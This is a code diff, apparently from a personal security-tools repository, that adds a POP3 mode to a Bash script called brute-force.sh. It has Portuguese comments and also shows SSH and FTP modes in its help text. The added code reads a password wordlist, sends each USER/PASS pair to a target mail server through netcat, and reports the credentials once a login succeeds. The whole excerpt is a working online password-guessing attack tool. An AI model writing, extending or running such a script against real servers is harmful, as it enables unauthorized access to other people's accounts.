@@ -45,7 +45,25 @@ elif [ "$1" == "-ftp" ]; then
       fi
   done
 
+elif [ "$1" == "-pop3" ]; then
+  user=$2
+  server=$3
+  port=$4
+  wordlist=$5
+  # Ler o arquivo de senhas e tentar cada uma
+  for pass in $(cat "$wordlist"); do
+      echo "Testing: [$port] Username: $user | Password: $pass"
+      result=$(echo -e "USER $user\nPASS $pass\nQUIT" | nc $server $port)
+      # echo vai passar os parametros de login pro netcat e result recebe os resultados
+      # USER usuario em seguida ele pede a senha que sera passada em PASS e por fim QUI pra sair e continuar o loop
+      if [[ $result == *"Logged in"* ]]; then # Logged in significa que o login foi OK
+          echo -e "\033[0;32m\nCorrect: [$port] Username: $user | Password: $pass\n\033[0m"
+          exit 0 # Quando o script encontra a senha correta e executa exit
+      fi
+  done
+
 elif [ "$1" == "-h" ]; then
   echo -e "\nbrute-force.sh -ssh [user@127.0.0.1] [port] [wordlist]"
-  echo -e "brute-force.sh -ftp [user] [server] [port] [wordlist]\n"
+  echo "brute-force.sh -ftp [user] [server] [port] [wordlist]"
+  echo -e "brute-force.sh -pop3 [user] [server] [port] [wordlist]\n"
 fi
